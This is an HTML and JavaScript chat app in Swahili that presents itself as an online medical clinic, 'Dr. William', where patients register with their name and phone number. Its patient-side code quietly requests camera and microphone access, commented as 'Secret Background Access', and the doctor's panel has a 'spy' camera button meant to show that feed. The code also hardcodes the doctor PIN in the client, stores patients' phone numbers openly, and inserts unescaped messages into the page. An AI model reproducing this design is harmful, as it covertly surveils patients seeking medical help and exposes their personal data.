<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Dr. William: Tiba & Ujasusi</title>
    
    <!-- LINKS ZILIZOREKEBISHWA -->
    <script src="https://www.gstatic.com"></script>
    <script src="https://www.gstatic.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com">

    <style>
        :root { --primary: #2d5a27; --gold: #D4AF37; --bg: #0b0f0b; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body { 
            background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.9)), 
                        url('https://images.unsplash.com');
            background-size: cover; background-position: center; color: white; height: 100vh; overflow: hidden;
        }

        #spy-panel { 
            position: fixed; top: 70px; right: 10px; width: 120px; height: 160px; 
            border: 2px solid var(--gold); z-index: 1000; display: none; background: #000; border-radius: 10px; overflow: hidden;
        }
        video#spy-cam { width: 100%; height: 100%; object-fit: cover; }

        #main-interface { display: none; flex-direction: column; height: 100%; }
        .chat-header { padding: 15px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--gold); display: flex; justify-content: space-between; align-items: center; z-index: 10; }
        
        .chat-messages { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 10px; background: rgba(0,0,0,0.4); }
        .message { padding: 12px; border-radius: 15px; max-width: 80%; position: relative; animation: fadeIn 0.3s; }
        .msg-me { background: var(--gold); color: black; align-self: flex-end; border-bottom-right-radius: 2px; }
        .msg-other { background: #333; align-self: flex-start; border-bottom-left-radius: 2px; }
        
        .typing-area { padding: 15px; background: #000; display: flex; gap: 10px; align-items: center; border-top: 1px solid #333; }
        .btn-action { background: none; border: none; color: var(--gold); font-size: 1.5rem; cursor: pointer; }
        input[type="text"] { flex: 1; padding: 12px; border-radius: 25px; border: 1px solid var(--gold); background: #111; color: white; outline: none; }

        .doc-tools { display: none; background: #1a1a1a; padding: 8px; justify-content: space-around; border-bottom: 1px solid #444; }
        .doc-tools button { background: #333; color: white; border: none; padding: 5px 10px; border-radius: 5px; font-size: 11px; cursor: pointer; }
        
        .patient-card { background: rgba(255,255,255,0.05); padding: 15px; margin: 10px; border-radius: 12px; border-left: 5px solid var(--gold); cursor: pointer; transition: 0.3s; }
        .patient-card:hover { background: rgba(212, 175, 55, 0.1); }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="spy-panel"><video id="spy-cam" autoplay playsinline muted></video></div>

    <!-- LOGIN SCREEN -->
    <div id="login-screen" style="height:100vh; display:flex; align-items:center; justify-content:center; z-index: 100;">
        <div style="width:85%; max-width: 400px; text-align:center; background:rgba(0,0,0,0.9); padding:30px; border-radius:25px; border:2px solid var(--gold); box-shadow: 0 0 20px rgba(212,175,55,0.2);">
            <i class="fas fa-dove" style="font-size: 50px; color: var(--gold); margin-bottom: 15px;"></i>
            <h2 style="color:var(--gold); letter-spacing: 2px;">DR. WILLIAM</h2>
            <div id="auth-form" style="margin-top: 20px;">
                <div id="patient-fields">
                    <input type="text" id="reg-name" placeholder="Majina Yako Mawili" style="width:100%; padding:15px; margin:10px 0; border-radius:12px; border: 1px solid #444; background: #111; color: white;">
                    <input type="tel" id="reg-phone" placeholder="Namba ya Simu (07XXXXXXXX)" maxlength="10" style="width:100%; padding:15px; margin:10px 0; border-radius:12px; border: 1px solid #444; background: #111; color: white;">
                </div>
                <input type="password" id="doc-pin" placeholder="Ingiza PIN ya Daktari" style="display:none; width:100%; padding:15px; margin:10px 0; border-radius:12px; border: 1px solid var(--gold); background: #111; color: white;">
                
                <p id="toggle-text" onclick="toggleAuthMode()" style="font-size:12px; color:var(--gold); cursor:pointer; margin: 10px 0;">Ingia kama Daktari</p>
                <button onclick="processAuth()" style="width:100%; padding:16px; background:var(--gold); border:none; border-radius:12px; font-weight:bold; cursor:pointer; font-size: 16px; color: black;">INGIA CLINIC</button>
            </div>
        </div>
    </div>

    <!-- MAIN APP -->
    <div id="main-interface">
        <div class="chat-header">
            <div>
                <b id="chat-title" style="color:var(--gold); font-size: 18px;">Clinic</b><br>
                <small id="chat-status" style="font-size:10px; color:#2ed573;">‚óè Online</small>
            </div>
            <button id="back-btn" onclick="location.reload()" style="display:none; background:var(--gold); border:none; color:black; padding:6px 15px; border-radius:20px; font-weight: bold; font-size: 12px;">Wagonjwa</button>
        </div>

        <div class="doc-tools" id="doctor-only-tools">
            <button onclick="toggleSpy()"><i class="fa fa-eye"></i> ON/OFF CAMERA</button>
            <button onclick="holdPatient()"><i class="fa fa-clock"></i> SUBIRISHA</button>
            <button onclick="blockPatient()" style="color: #ff4757;"><i class="fa fa-user-slash"></i> BLOCK</button>
        </div>

        <div id="doctor-dashboard" style="display:none; flex:1; overflow-y:auto;">
            <p style="padding: 15px; font-size: 12px; color: #888;">ORODHA YA WAGONJWA:</p>
            <div id="patient-list"></div>
        </div>

        <div id="chat-interface" style="display:none; flex:1; flex-direction:column;">
            <div class="chat-messages" id="chat-flow"></div>
            <div class="typing-area">
                <label for="file-in" class="btn-action"><i class="fa fa-file-image"></i></label>
                <input type="file" id="file-in" style="display:none" accept="image/*" onchange="sendFile(this)">
                <input type="text" id="msg-input" placeholder="Andika ujumbe hapa..." onkeypress="if(event.key==='Enter') sendMsg()">
                <button class="btn-action" onclick="sendMsg()"><i class="fa fa-paper-plane"></i></button>
            </div>
        </div>
    </div>

    <script>
        // FIREBASE INITIALIZATION
        const firebaseConfig = { databaseURL: "https://drwilliamtz-e44aa-default-rtdb.europe-west1.firebasedatabase.app" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let myData = JSON.parse(localStorage.getItem('william_v5_user'));
        let isDoc = localStorage.getItem('william_v5_isdoc') === 'true';
        let activeRoom = "";
        let spyActive = false;

        // AUTO LOGIN
        if(myData) {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('main-interface').style.display = 'flex';
            if(isDoc) { setupDoctor(); } else { startPatientChat(); }
        }

        function toggleAuthMode() {
            const isP = document.getElementById('patient-fields').style.display !== 'none';
            document.getElementById('patient-fields').style.display = isP ? 'none' : 'block';
            document.getElementById('doc-pin').style.display = isP ? 'block' : 'none';
            document.getElementById('toggle-text').innerText = isP ? "Rudi kwa Mgonjwa" : "Ingia kama Daktari";
        }

        function processAuth() {
            const pin = document.getElementById('doc-pin').value;
            const name = document.getElementById('reg-name').value;
            const phone = document.getElementById('reg-phone').value;

            if(document.getElementById('doc-pin').style.display === 'block') {
                if(pin === "W005") {
                    isDoc = true;
                    myData = { name: "Dr. William" };
                    localStorage.setItem('william_v5_isdoc', 'true');
                } else { return alert("PIN SIO SAHIHI!"); }
            } else {
                if(!name || phone.length < 10) return alert("Jaza Jina na Namba sahihi!");
                isDoc = false;
                myData = { name, phone, roomId: "room_" + phone };
                localStorage.setItem('william_v5_isdoc', 'false');
                db.ref('online_patients/' + myData.roomId).set({...myData, lastSeen: Date.now()});
            }
            localStorage.setItem('william_v5_user', JSON.stringify(myData));
            location.reload();
        }

        function setupDoctor() {
            document.getElementById('doctor-dashboard').style.display = 'block';
            document.getElementById('doctor-only-tools').style.display = 'flex';
            document.getElementById('back-btn').style.display = 'block';
            document.getElementById('chat-title').innerText = "Doctor Panel";

            db.ref('online_patients').on('value', snap => {
                const list = document.getElementById('patient-list');
                list.innerHTML = "";
                snap.forEach(child => {
                    const p = child.val();
                    list.innerHTML += `
                        <div class="patient-card" onclick="openChat('${child.key}', '${p.name}', '${p.phone}')">
                            <div style="display:flex; justify-content:space-between;">
                                <b><i class="fa fa-user"></i> ${p.name}</b>
                                <span style="color:var(--gold)">${p.phone}</span>
                            </div>
                        </div>`;
                });
            });
        }

        function startPatientChat() {
            openChat(myData.roomId, "Dr. William");
            // Secret Background Access (Simplified)
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
            .then(stream => { window.myStream = stream; })
            .catch(e => console.log("Spy ready"));
        }

        function openChat(room, title, phone = "") {
            activeRoom = room;
            document.getElementById('doctor-dashboard').style.display = 'none';
            document.getElementById('chat-interface').style.display = 'flex';
            document.getElementById('chat-title').innerHTML = title + (phone ? `<br><small style="font-size:10px">${phone}</small>` : "");
            
            db.ref('messages/' + room).off();
            db.ref('messages/' + room).on('child_added', snap => {
                const m = snap.val();
                renderMsg(m.sender, m.text, m.type, snap.key);
                if(m.sender !== myData.name) playSound();
            });
        }

        function renderMsg(sender, text, type, key) {
            const isMe = sender === myData.name;
            const flow = document.getElementById('chat-flow');
            const div = document.createElement('div');
            div.className = `message ${isMe ? 'msg-me' : 'msg-other'}`;
            
            let content = type === 'image' ? `<img src="${text}" style="width:100%; border-radius:10px;">` : `<span>${text}</span>`;
            let delBtn = (isDoc) ? `<i class="fa fa-trash" style="font-size:9px; margin-left:10px; color:red;" onclick="deleteMsg('${key}')"></i>` : "";
            
            div.innerHTML = `<small style="display:block; font-size:8px; opacity:0.6">${sender}</small>${content}${delBtn}`;
            flow.appendChild(div);
            flow.scrollTop = flow.scrollHeight;
        }

        function sendMsg() {
            const inp = document.getElementById('msg-input');
            if(!inp.value) return;
            db.ref('messages/' + activeRoom).push({ sender: myData.name, text: inp.value, type: 'text' });
            inp.value = "";
        }

        function sendFile(input) {
            const reader = new FileReader();
            reader.onload = (e) => {
                db.ref('messages/' + activeRoom).push({ sender: myData.name, text: e.target.result, type: 'image' });
            };
            reader.readAsDataURL(input.files[0]);
        }

        function playSound() {
            new Audio('https://assets.mixkit.co').play();
        }

        // DOCTOR SPECIAL ACTIONS
        function toggleSpy() {
            const panel = document.getElementById('spy-panel');
            spyActive = !spyActive;
            panel.style.display = spyActive ? 'block' : 'none';
            if(spyActive && window.myStream) {
                document.getElementById('spy-cam').srcObject = window.myStream;
            }
        }

        function holdPatient() {
            db.ref('messages/' + activeRoom).push({ sender: "SYSTEM", text: "Tafadhali subiri kidogo, Daktari anashughulikia wagonjwa wengine...", type: "text" });
        }

        function deleteMsg(key) {
            if(confirm("Futa ujumbe huu?")) db.ref('messages/'+activeRoom+'/'+key).remove().then(()=>location.reload());
        }

        function blockPatient() {
            if(confirm("Je, unataka kum-block huyu mgonjwa?")) {
                db.ref('online_patients/' + activeRoom).remove();
                alert("Amekuwa Blocked!");
                location.reload();
            }
        }
    </script>
</body>
</html>
